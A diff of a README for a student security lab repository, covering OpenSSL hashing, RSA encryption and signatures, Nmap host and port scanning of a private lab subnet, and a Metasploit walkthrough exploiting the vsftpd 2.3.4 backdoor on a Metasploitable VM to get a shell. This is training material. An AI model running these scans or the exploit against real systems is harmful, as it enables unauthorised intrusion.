@@ -1,46 +1,36 @@
 # cryptography-openssl-security-lab
-Cryptography and penetration testing lab using OpenSSL, Nmap, and Metasploit in a controlled Kali Linux environment.
-Cryptography & Penetration Testing Lab
+This project demonstrates cryptography fundamentals and basic vulnerability assessment techniques using OpenSSL, Nmap, and the Metasploit Framework in a controlled Kali Linux lab environment.
 
-This project demonstrates basic cryptography operations and vulnerability assessment techniques using OpenSSL, Nmap, and the Metasploit Framework in a controlled lab environment.
+## Tools Used
+- Kali Linux
+- OpenSSL
+- Nmap
+- Metasploit Framework
+- Metasploitable (target VM)
 
-Tools Used
+## Cryptography Tasks
 
-Kali Linux
+### Hashing (Data Integrity)
+Hashing converts data into a fixed-length value to verify data integrity.
 
-OpenSSL
+Tasks performed:
+- Generated MD5 hash values
+- Generated SHA256 hash values
+- Verified file integrity after modifying data
 
-Nmap
+Example commands:
+```bash
+echo -n "hello123" | openssl dgst -md5
+openssl dgst -sha256 hashedfile.txt
+Encryption & Decryption (RSA)
 
-Metasploit Framework
-
-Metasploitable Virtual Machine
-
-Cryptography Tasks
-Hashing
-
-Generated hash values using cryptographic algorithms to verify data integrity.
-
-Examples:
-
-echo -n "text" | openssl dgst -md5
-openssl dgst -sha256 file.txt
+Implemented RSA public-key encryption to protect sensitive information.
 
 Tasks performed:
 
-Generate MD5 hash values
+Generated RSA private key
 
-Generate SHA256 hash values
-
-Verify file integrity after modification
-
-Encryption & Decryption
-
-Implemented RSA encryption to protect sensitive data.
-
-Tasks performed:
-
-Generated RSA public/private key pair
+Generated RSA public key
 
 Encrypted a file using the public key
 
@@ -50,78 +40,69 @@ Example commands:
 
 openssl genpkey -algorithm RSA -out private_key.pem
 openssl rsa -pubout -in private_key.pem -out public_key.pem
+openssl pkeyutl -encrypt -pubin -inkey public_key.pem -in password.txt -out encrypted.bin
+openssl pkeyutl -decrypt -inkey private_key.pem -in encrypted.bin -out decrypted.txt
 Digital Signatures
 
-Used OpenSSL to create and verify digital signatures to ensure data authenticity.
+Digital signatures verify authenticity and integrity of data.
 
 Tasks performed:
 
-Created digital signatures for files
+Created digital signature for a file
 
-Verified signatures using public keys
+Verified the signature using the public key
 
-Validated file integrity
-
-Example:
+Example commands:
 
 openssl dgst -sha256 -sign private_key.pem -out signature.sha256 document.txt
 openssl dgst -sha256 -verify public_key.pem -signature signature.sha256 document.txt
 Vulnerability Assessment
 
-Performed network scanning to discover hosts and open services.
+Performed network discovery and service scanning to identify open ports and running services on target machines.
 
-Tools used:
-
-Nmap
-
-Metasploit
-
-Example scan:
+Example scanning commands:
 
 db_nmap -sn 192.168.10.0/24
 db_nmap -sS -p- 192.168.10.200
+db_nmap -sV -p 21 192.168.10.200
 
 Tasks performed:
 
-Discover active hosts
+Discovered active hosts
 
-Identify open ports
+Identified open ports
 
-Detect running services
+Detected running services
 
 Penetration Testing
 
-Simulated an FTP exploitation scenario using the vsftpd 2.3.4 backdoor vulnerability on the Metasploitable virtual machine.
+Simulated exploitation of the vsftpd 2.3.4 FTP backdoor vulnerability on the Metasploitable virtual machine using Metasploit.
 
-Steps performed:
+Example exploitation workflow:
 
-Launch Metasploit framework
-
-Identify FTP vulnerability
-
-Execute exploit module
-
-Gain shell access to the target system
-
-Example:
-
+msfconsole
+search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.10.200
+set PAYLOAD cmd/unix/interact
 exploit
+
+If successful, the exploit provides shell access to the target system.
+
 Learning Outcomes
 
-Through this lab, the following cybersecurity concepts were practiced:
+Through this lab the following cybersecurity concepts were practiced:
 
-Cryptographic hashing
+Cryptographic hashing and data integrity verification
 
-Encryption and decryption
+RSA encryption and decryption
 
-Digital signatures
+Digital signatures and authentication
 
-Vulnerability scanning
+Vulnerability scanning and service enumeration
 
-Basic penetration testing workflow
+Basic penetration testing workflow using Metasploit
 
 Project Documentation
 
-The full project documentation and screenshots are included in the repository.
+Full project documentation and screenshots are included in this repository.
